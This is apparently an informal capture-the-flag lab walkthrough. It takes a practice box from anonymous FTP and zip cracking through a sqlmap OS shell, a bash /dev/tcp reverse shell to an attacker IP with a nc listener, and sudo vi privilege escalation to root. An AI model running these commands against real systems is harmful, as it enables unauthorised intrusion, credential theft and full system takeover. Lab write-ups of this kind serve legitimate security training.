after scanning this box

it has an ssh, ftp, and http
server open

connecting anonomously to the ftp
there is a backup.zip file
but this has a password,
using john2zip we can get a hash to crack with john
after cracking it, we find the password
and can unzip it,
it has 2 files: index.php and style.css

in the index we can find a username and a password that is md5 encoded

using these we can login to the site
this presents us with a catalogue and a search option,
looking up we can find a paramater is added in the url

so trying some sql injections with sqlmap, giving it our cookie from being logged in

sqlmap -u "http://{boxip}/dashboard.php?search=test" --os-shell --cookie="PHPSESSID={cookievalue}"

we got a simple shell

so we can use this to make it a somewhat better shell
using a listener on our hack_box (using https://www.revshells.com/)
`nc -lvnp 9001`

and then we connect using:
`bash -c "bash -i >& /dev/tcp/10.10.15.51/9001 0>&1"`

using this we can continue and find we are the postgres user with whoami
then searching in the website folder
we find the password ('cat /var/www/html/dashboard.php') for the postgres user
and we loign with ssh to this user

using sudo -l  inhere we find we can use vi with sudo
`sudo vi /{afile}`

thus we open the vi,
and using the following we are able to execute commands
`CTRL+C
:!/bin/ls -l
:!/bin/ls -l /
:!/bin/ls -l /root
:!/bin/vi -l /root/root.txt`